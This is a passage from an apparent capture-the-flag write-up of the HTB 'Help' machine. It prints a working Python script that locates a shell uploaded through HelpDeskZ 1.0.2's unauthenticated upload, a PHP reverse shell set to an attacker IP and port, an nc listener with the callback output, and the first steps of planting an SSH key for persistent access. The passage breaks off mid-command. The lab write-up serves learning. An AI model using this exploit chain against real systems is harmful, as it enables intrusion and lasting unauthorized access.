+                currentTime&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:700">int</span>((datetime.datetime.strptime(r.headers[<span style="color:#3ad900;font-weight:400">'date'</span>],&nbsp;<span style="color:#3ad900;font-weight:400">"%a,&nbsp;%d&nbsp;%b&nbsp;%Y&nbsp;%H:%M:%S&nbsp;%Z"</span>)&nbsp;-&nbsp;datetime.datetime(<span style="color:#ff0044;font-weight:400">1970</span>,<span style="color:#ff0044;font-weight:400">1</span>,<span style="color:#ff0044;font-weight:400">1</span>)).total_seconds())<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">for</span>&nbsp;x&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;<span style="color:#ff9d00;font-weight:700">range</span>(<span style="color:#ff0044;font-weight:400">0</span>,&nbsp;<span style="color:#ff0044;font-weight:400">300</span>)<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;plaintext&nbsp;=&nbsp;fileName&nbsp;+&nbsp;<span style="color:#ff9d00;font-weight:700">str</span>(currentTime&nbsp;-&nbsp;x)<br>
+                [......]
+            </div>
+        </div><br>
+        <br>
+        My script looked slightly different because I thoguht the <code>Expiry</code> header of the server with an old date in it strange, so I wrote checks for that time as well. Turns out it was a rabbit hole and a waste of time.<br>
+        <br>
+        My script:<br>
+            <div class="codebox">
+                <span style="color:#333333;font-weight:400">import</span>&nbsp;hashlib<br>
+                <span style="color:#333333;font-weight:400">import</span>&nbsp;time<br>
+                <span style="color:#333333;font-weight:400">import</span>&nbsp;sys<br>
+                <span style="color:#333333;font-weight:400">import</span>&nbsp;requests<br>
+                <span style="color:#333333;font-weight:400">import</span>&nbsp;datetime<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">'Helpdeskz&nbsp;v1.0.2&nbsp;-&nbsp;Unauthenticated&nbsp;shell&nbsp;upload&nbsp;exploit'</span><br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">if</span>&nbsp;<span style="color:#ff9d00;font-weight:700">len</span>(sys.argv)&nbsp;&lt;&nbsp;<span style="color:#ff0044;font-weight:400">3</span>:<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"Usage:&nbsp;{}&nbsp;[baseUrl]&nbsp;[nameOfUploadedFile]"</span>.format(sys.argv[<span style="color:#ff0044;font-weight:400">0</span>])<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;sys.exit(<span style="color:#ff0044;font-weight:400">1</span>)<br>
+                <br>
+                helpdeskzBaseUrl&nbsp;=&nbsp;sys.argv[<span style="color:#ff0044;font-weight:400">1</span>]<br>
+                fileName&nbsp;=&nbsp;sys.argv[<span style="color:#ff0044;font-weight:400">2</span>]<br>
+                <br>
+                r&nbsp;=&nbsp;requests.get(helpdeskzBaseUrl)<br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#expires&nbsp;epoch&nbsp;time</span><br>
+                expiresTime&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">375007920</span><br>
+                <span style="color:#0088ff;font-weight:400">#get&nbsp;current&nbsp;time&nbsp;of&nbsp;server</span><br>
+                currentServerTime&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:700">int</span>((datetime.datetime.strptime(r.headers[<span style="color:#3ad900;font-weight:400">'date'</span>],&nbsp;<span style="color:#3ad900;font-weight:400">"%a,&nbsp;%d&nbsp;%b&nbsp;%Y&nbsp;%H:%M:%S&nbsp;%Z"</span>)&nbsp;-&nbsp;datetime.datetime(<span style="color:#ff0044;font-weight:400">1970</span>,<span style="color:#ff0044;font-weight:400">1</span>,<span style="color:#ff0044;font-weight:400">1</span>)).total_seconds())<br>
+                <span style="color:#0088ff;font-weight:400">#print&nbsp;out&nbsp;times</span><br>
+                <span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"Current&nbsp;server&nbsp;time:&nbsp;"</span>&nbsp;+<span style="color:#ff9d00;font-weight:700">str</span>(currentServerTime)<br>
+                <span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"Expires&nbsp;header&nbsp;time:&nbsp;"</span>&nbsp;+<span style="color:#ff9d00;font-weight:700">str</span>(expiresTime)<br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#check&nbsp;for&nbsp;file&nbsp;using&nbsp;epoch&nbsp;time</span><br>
+                <span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"[+]check&nbsp;epoch&nbsp;time..."</span><br>
+                plaintext1&nbsp;=&nbsp;fileName&nbsp;+&nbsp;<span style="color:#ff9d00;font-weight:700">str</span>(expiresTime)<br>
+                md5hash1&nbsp;=&nbsp;hashlib.md5(plaintext1).hexdigest()<br>
+                url1&nbsp;=&nbsp;helpdeskzBaseUrl+md5hash1+<span style="color:#3ad900;font-weight:400">'.php'</span><br>
+                response&nbsp;=&nbsp;requests.head(url1)<br>
+                <span style="color:#ff9d00;font-weight:700">if</span>&nbsp;response.status_code&nbsp;==&nbsp;<span style="color:#ff0044;font-weight:400">200</span>:<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"found!&nbsp;-&nbsp;epoch&nbsp;time"</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;url1<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sys.exit(<span style="color:#ff0044;font-weight:400">0</span>)<br>
+                <span style="color:#ff9d00;font-weight:700">else</span>:<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"[-]NOPE,&nbsp;not&nbsp;epoch&nbsp;time"</span><br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#check&nbsp;for&nbsp;file&nbsp;using&nbsp;server&nbsp;time</span><br>
+                <span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"[+]check&nbsp;server&nbsp;time&nbsp;minus&nbsp;last&nbsp;5&nbsp;minutes..."</span><br>
+                <span style="color:#ff9d00;font-weight:700">for</span>&nbsp;x&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;<span style="color:#ff9d00;font-weight:700">range</span>(<span style="color:#ff0044;font-weight:400">0</span>,&nbsp;<span style="color:#ff0044;font-weight:400">300</span>):<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;plaintext2&nbsp;=&nbsp;fileName&nbsp;+&nbsp;<span style="color:#ff9d00;font-weight:700">str</span>(currentServerTime&nbsp;-&nbsp;x)<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;md5hash2&nbsp;=&nbsp;hashlib.md5(plaintext2).hexdigest()<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;url2&nbsp;=&nbsp;helpdeskzBaseUrl+md5hash2+<span style="color:#3ad900;font-weight:400">'.php'</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;response&nbsp;=&nbsp;requests.head(url2)<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;response.status_code&nbsp;==&nbsp;<span style="color:#ff0044;font-weight:400">200</span>:<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"found!&nbsp;-&nbsp;server&nbsp;time"</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;url2<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sys.exit(<span style="color:#ff0044;font-weight:400">0</span>)<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"[-]NOPE,&nbsp;not&nbsp;server&nbsp;time"</span>
+            </div>
+        </div><br>
+        <br>
+        <a id="h3-6" name="h3-6"></a><strong></strong>
+        <h3><strong>3d) Get a shell</strong></h3><br>
+        Put everything together and get a shell, finally.<br>
+        <br>
+        Prep the shell:<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>help#&nbsp;<span style="color:#ff9d00;font-weight:700">cp</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>webshells<span style="color:#ff9d00;font-weight:700">/</span>php<span style="color:#ff9d00;font-weight:700">/</span>php-reverse-shell.php&nbsp;.<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>help#&nbsp;<span style="color:#ff9d00;font-weight:700">mv</span>&nbsp;php-reverse-shell.php&nbsp;monkey.php<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>help#&nbsp;nano&nbsp;monkey.php<br>
+                ...<br>
+                <span style="color:#7f0044;font-weight:400">$VERSION</span>&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"1.0"</span><span style="color:#ff9d00;font-weight:700">;</span><br>
+                <span style="color:#7f0044;font-weight:400">$ip</span>&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">'10.10.13.79'</span><span style="color:#ff9d00;font-weight:700">;</span>&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">//</span>&nbsp;CHANGE&nbsp;THIS<br>
+                <span style="color:#7f0044;font-weight:400">$port</span>&nbsp;=&nbsp;4441<span style="color:#ff9d00;font-weight:700">;</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">//</span>&nbsp;CHANGE&nbsp;THIS<br>
+                <span style="color:#7f0044;font-weight:400">$chunk_size</span>&nbsp;=&nbsp;1400<span style="color:#ff9d00;font-weight:700">;</span><br>
+                ...<br>
+            </div>
+        </div><br>
+        ctrl+O to save the file in nano.<br>
+        <br>
+        Submit a ticket and upload the file.<br>
+        <img alt="images\2-6.png" src="images/2-6.png"><br>
+        <br>
+        Run the script to find the name of our file:<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>help<span style="color:#ff9d00;font-weight:700">/</span>exploit#&nbsp;python&nbsp;40300updated.py&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>10.10.10.121<span style="color:#ff9d00;font-weight:700">/</span>support<span style="color:#ff9d00;font-weight:700">/</span>uploads<span style="color:#ff9d00;font-weight:700">/</span>tickets<span style="color:#ff9d00;font-weight:700">/</span>&nbsp;monkey.php<br>
+                Helpdeskz&nbsp;v1.0.2&nbsp;-&nbsp;Unauthenticated&nbsp;shell&nbsp;upload&nbsp;exploit<br>
+                Current&nbsp;server&nbsp;time<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;1557938496<br>
+                Expires&nbsp;header&nbsp;time<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;375007920<br>
+                [+]check&nbsp;epoch&nbsp;time...<br>
+                [-]NOPE,&nbsp;not&nbsp;epoch&nbsp;time<br>
+                [+]check&nbsp;server&nbsp;time&nbsp;minus&nbsp;<span style="color:#ff9d00;font-weight:700">last</span>&nbsp;5&nbsp;minutes...<br>
+                found<span style="color:#ff9d00;font-weight:700">!</span>&nbsp;-&nbsp;server&nbsp;time<br>
+                http<span style="color:#ff9d00;font-weight:700">://</span>10.10.10.121<span style="color:#ff9d00;font-weight:700">/</span>support<span style="color:#ff9d00;font-weight:700">/</span>uploads<span style="color:#ff9d00;font-weight:700">/</span>tickets<span style="color:#ff9d00;font-weight:700">/</span>0543943051acbed7481441df8e40486f.php
+            </div>
+        </div><br>
+        <br>
+        Start a listener to receive the shell:<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>help#&nbsp;nc&nbsp;-lvnp&nbsp;4441<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;4441&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        Navigate to the url your script just found and you should get a callback on your listener:<br>
+            <div class="codebox">
+                ...<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;4441&nbsp;...<br>
+                connect&nbsp;to&nbsp;[10.10.13.79]&nbsp;from&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>UNKNOWN<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;[10.10.10.121]&nbsp;44092<br>
+                Linux&nbsp;<span style="color:#ff9d00;font-weight:700">help</span>&nbsp;4.4.0-116-generic&nbsp;<span style="color:#0088ff;font-weight:400">#140-Ubuntu&nbsp;SMP&nbsp;Mon&nbsp;Feb&nbsp;12&nbsp;21:23:04&nbsp;UTC&nbsp;2018&nbsp;x86_64&nbsp;x86_64&nbsp;x86_64&nbsp;GNU/Linux</span><br>
+                &nbsp;09<span style="color:#ff9d00;font-weight:700">:</span>42<span style="color:#ff9d00;font-weight:700">:</span>10&nbsp;up&nbsp;5&nbsp;min,&nbsp;&nbsp;0&nbsp;users,&nbsp;&nbsp;load&nbsp;average<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;0.12,&nbsp;0.24,&nbsp;0.12<br>
+                USER&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;TTY&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FROM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LOGIN@&nbsp;&nbsp;&nbsp;IDLE&nbsp;&nbsp;&nbsp;JCPU&nbsp;&nbsp;&nbsp;PCPU&nbsp;WHAT<br>
+                <span style="color:#7f0044;font-weight:400">uid</span>=1000<span style="color:#ff9d00;font-weight:700">(help)</span>&nbsp;gid=1000<span style="color:#ff9d00;font-weight:700">(help)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">groups</span>=1000<span style="color:#ff9d00;font-weight:700">(help)</span>,4<span style="color:#ff9d00;font-weight:700">(</span>adm<span style="color:#ff9d00;font-weight:700">)</span>,24<span style="color:#ff9d00;font-weight:700">(</span>cdrom<span style="color:#ff9d00;font-weight:700">)</span>,30<span style="color:#ff9d00;font-weight:700">(</span>dip<span style="color:#ff9d00;font-weight:700">)</span>,33<span style="color:#ff9d00;font-weight:700">(</span>www-data<span style="color:#ff9d00;font-weight:700">)</span>,46<span style="color:#ff9d00;font-weight:700">(</span>plugdev<span style="color:#ff9d00;font-weight:700">)</span>,114<span style="color:#ff9d00;font-weight:700">(</span>lpadmin<span style="color:#ff9d00;font-weight:700">)</span>,115<span style="color:#ff9d00;font-weight:700">(</span>sambashare<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/sh:</span>&nbsp;0<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;can<span style="color:#3ad900;font-weight:400">'t&nbsp;access&nbsp;tty;&nbsp;job&nbsp;control&nbsp;turned&nbsp;off<br>
+                $&nbsp;pwd<br>
+                /</span>
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-4" name="h2-4"></a><strong></strong>
+        <h2><strong>4) php shell to ssh shell</strong></h2><br>
+        I like to elevate to a fully functional/more reliable shell if I can, and ssh was running so this was an easy opportunity.<br>
+        <br>
+        Generate an ssh key pair you don't have one already, and start the ssh service on your kali machine:<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~#&nbsp;<span style="color:#ff9d00;font-weight:700">ssh-keygen</span>&nbsp;-t&nbsp;rsa&nbsp;-b&nbsp;4096<br>
+                Generating&nbsp;public<span style="color:#ff9d00;font-weight:700">/</span>private&nbsp;rsa&nbsp;key&nbsp;pair.<br>
+                Enter&nbsp;<span style="color:#ff9d00;font-weight:700">file</span>&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;<span style="color:#ff9d00;font-weight:700">which</span>&nbsp;to&nbsp;save&nbsp;the&nbsp;key&nbsp;<span style="color:#ff9d00;font-weight:700">(/</span>root<span style="color:#ff9d00;font-weight:700">/</span>.ssh<span style="color:#ff9d00;font-weight:700">/</span>id_rsa<span style="color:#ff9d00;font-weight:700">):</span>&nbsp;<br>
+                Enter&nbsp;passphrase&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>empty&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">no</span>&nbsp;passphrase):&nbsp;<br>
+                Enter&nbsp;same&nbsp;passphrase&nbsp;again:&nbsp;<br>
+                Your&nbsp;identification&nbsp;has&nbsp;been&nbsp;saved&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>root<span style="color:#ff9d00;font-weight:700">/</span>.ssh<span style="color:#ff9d00;font-weight:700">/</span>id_rsa.<br>
+                Your&nbsp;public&nbsp;key&nbsp;has&nbsp;been&nbsp;saved&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>root<span style="color:#ff9d00;font-weight:700">/</span>.ssh<span style="color:#ff9d00;font-weight:700">/</span>id_rsa.pub.<br>
+                The&nbsp;key&nbsp;fingerprint&nbsp;is<span style="color:#ff9d00;font-weight:700">:</span><br>
+                SHA256<span style="color:#ff9d00;font-weight:700">:</span>C4J3JBqH+VxROjOASyX0MX0UHyJLl<span style="color:#ff9d00;font-weight:700">/</span>lk+w6Wez+NXOY&nbsp;root@kali<br>
+                The&nbsp;keys&nbsp;randomart&nbsp;image&nbsp;is<span style="color:#ff9d00;font-weight:700">:</span><br>
+                +---[RSA&nbsp;4096]----+<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;.oo=.+o*+.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;o=&nbsp;=.*+oo.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;.+.+&nbsp;O.&nbsp;+..&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;.B&nbsp;+&nbsp;+&nbsp;&nbsp;o&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;o&nbsp;=&nbsp;o&nbsp;S&nbsp;&nbsp;o&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">.</span>&nbsp;o&nbsp;<span style="color:#ff9d00;font-weight:700">.</span>&nbsp;.+&nbsp;<span style="color:#ff9d00;font-weight:700">.</span>&nbsp;&nbsp;&nbsp;o<span style="color:#ff9d00;font-weight:700">|</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;..&nbsp;+&nbsp;<span style="color:#ff9d00;font-weight:700">.</span>&nbsp;*&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">.</span>&nbsp;o&nbsp;+&nbsp;E<span style="color:#ff9d00;font-weight:700">|</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">.</span>&nbsp;...&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                +----[SHA256]-----+<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~#&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;~<span style="color:#ff9d00;font-weight:700">/</span>.ssh<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>.ssh#&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;-alh<br>
+                id_rsa&nbsp;&nbsp;id_rsa.pub&nbsp;&nbsp;known_hosts<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>.ssh#&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;id_rsa.pub<br>
+                ssh-rsa&nbsp;AAAAB3NzaC1yc2EAAAADAQABAAACAQDubnsite6+BZra+1yAChYHV4ar8P0vkke1IWlZLwGP85bThoKe+pICmD15nweBXA4Rp5UMfJLBzBtXMN+QhVXBvkzAzTHeOIFAxBY<span style="color:#ff9d00;font-weight:700">/</span>VE6FSBOTGYs+Q77Hnwdt7gIqqmXmUTpOwM0bPxnJTAh6L7lP9D+k+PK060BwmAmiPRHLyKa0KTbIRilRQZB4G8Fb9DOAweXr+r8d0Bw7<span style="color:#ff9d00;font-weight:700">/</span>rUD3tUfSO2qcyuh2D7yQbCrwj1orYcj9r1ApYdPAZtqDmKknMtVGFjUVBIoti9iVZ6DD75lfRHclyqChgKDt2d7D0nDfTED2PaaoEG6vmGfHp51cNA21Fdh71mR1gE5T9V2IoCFujN7Ls7WSHn+K+q0s4m2VMgMYe1GT9+dxKIkYrqIs72m5Qt2GA8CarPatG2ZQ109<span style="color:#ff9d00;font-weight:700">/</span>KZc9p9so7lpTJlxbiQg58CkwpFIBP0uXj9CHMPnG7D5Cr3eaz8sU3egyflT4YaXx1PB2IdrACorukDtgDpxKWRVFduyf7qLhR9Yjsr358cgaBRh89V+RImmhVrioQOx9brl70NbNO<span style="color:#ff9d00;font-weight:700">/</span>jgav7ACo8<span style="color:#ff9d00;font-weight:700">/</span>P0wk2WzDGB6W05y+pagAAhu4zdsksXyB<span style="color:#ff9d00;font-weight:700">/</span>VImOZ4Sx9dzJTyBUnjIWIbKDmS+m+H28Vkm2rzLYefSxPNMBtuMquvCuZV15mHMx97MDRF<span style="color:#ff9d00;font-weight:700">/</span>qxeNiKUpFG2kX0FF7eYCI2BVw==&nbsp;root@kali<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>.ssh#&nbsp;service&nbsp;<span style="color:#ff9d00;font-weight:700">ssh</span>&nbsp;start<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>.ssh#&nbsp;service&nbsp;<span style="color:#ff9d00;font-weight:700">ssh</span>&nbsp;status<br>
+                �&nbsp;ssh.service&nbsp;-&nbsp;OpenBSD&nbsp;Secure&nbsp;Shell&nbsp;server<br>
+                &nbsp;&nbsp;&nbsp;Loaded<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;loaded&nbsp;<span style="color:#ff9d00;font-weight:700">(/</span>lib<span style="color:#ff9d00;font-weight:700">/</span>systemd<span style="color:#ff9d00;font-weight:700">/</span>system<span style="color:#ff9d00;font-weight:700">/</span>ssh.service<span style="color:#ff9d00;font-weight:700">;</span>&nbsp;disabled<span style="color:#ff9d00;font-weight:700">;</span>&nbsp;vendor&nbsp;preset<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;disabled<span style="color:#ff9d00;font-weight:700">)</span><br>
+                &nbsp;&nbsp;&nbsp;Active<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;active&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>running<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;since&nbsp;Wed&nbsp;2019-05-15&nbsp;18<span style="color:#ff9d00;font-weight:700">:</span>55<span style="color:#ff9d00;font-weight:700">:</span>36&nbsp;BST<span style="color:#ff9d00;font-weight:700">;</span>&nbsp;3s&nbsp;ago<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Docs<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">man:</span>sshd<span style="color:#ff9d00;font-weight:700">(</span>8<span style="color:#ff9d00;font-weight:700">)</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">man:</span>sshd_config<span style="color:#ff9d00;font-weight:700">(</span>5<span style="color:#ff9d00;font-weight:700">)</span><br>
+                &nbsp;&nbsp;Process<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;19010&nbsp;ExecStartPre=<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>sbin<span style="color:#ff9d00;font-weight:700">/</span>sshd&nbsp;-t&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>code=exited,&nbsp;status=0<span style="color:#ff9d00;font-weight:700">/</span>SUCCESS<span style="color:#ff9d00;font-weight:700">)</span><br>
+                &nbsp;Main&nbsp;PID<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;19011&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>sshd<span style="color:#ff9d00;font-weight:700">)</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;Tasks<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;1&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>limit<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;4915<span style="color:#ff9d00;font-weight:700">)</span><br>
+                &nbsp;&nbsp;&nbsp;Memory<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;1.6M<br>
+                &nbsp;&nbsp;&nbsp;CGroup<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>system.slice<span style="color:#ff9d00;font-weight:700">/</span>ssh.service<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;└─19011&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>sbin<span style="color:#ff9d00;font-weight:700">/</span>sshd&nbsp;-D<br>
+                <br>
+                May&nbsp;15&nbsp;18<span style="color:#ff9d00;font-weight:700">:</span>55<span style="color:#ff9d00;font-weight:700">:</span>36&nbsp;kali&nbsp;systemd[1]<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Starting&nbsp;OpenBSD&nbsp;Secure&nbsp;Shell&nbsp;server...<br>
+                May&nbsp;15&nbsp;18<span style="color:#ff9d00;font-weight:700">:</span>55<span style="color:#ff9d00;font-weight:700">:</span>36&nbsp;kali&nbsp;sshd[19011]<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Server&nbsp;listening&nbsp;on&nbsp;0.0.0.0&nbsp;port&nbsp;22.<br>
+                May&nbsp;15&nbsp;18<span style="color:#ff9d00;font-weight:700">:</span>55<span style="color:#ff9d00;font-weight:700">:</span>36&nbsp;kali&nbsp;sshd[19011]<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Server&nbsp;listening&nbsp;on&nbsp;<span style="color:#ff9d00;font-weight:700">::</span>&nbsp;port&nbsp;22.<br>
+                May&nbsp;15&nbsp;18<span style="color:#ff9d00;font-weight:700">:</span>55<span style="color:#ff9d00;font-weight:700">:</span>36&nbsp;kali&nbsp;systemd[1]<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Started&nbsp;OpenBSD&nbsp;Secure&nbsp;Shell&nbsp;server.
+            </div>
+        </div><br>
+        <br>
+        Create the .ssh directory on the php shell you just popped and echo your attacking machine's ssh public key - the contents of <code>id_rsa.pub</code> - into authorized_keys file in /home/help/.ssh/authorized_keys and set the file permissions properly:<br>
+            <div class="codebox">
+                $&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>help<br>
+                $&nbsp;<span style="color:#ff9d00;font-weight:700">mkdir</span>&nbsp;.ssh<br>
+                $&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;.ssh<br>
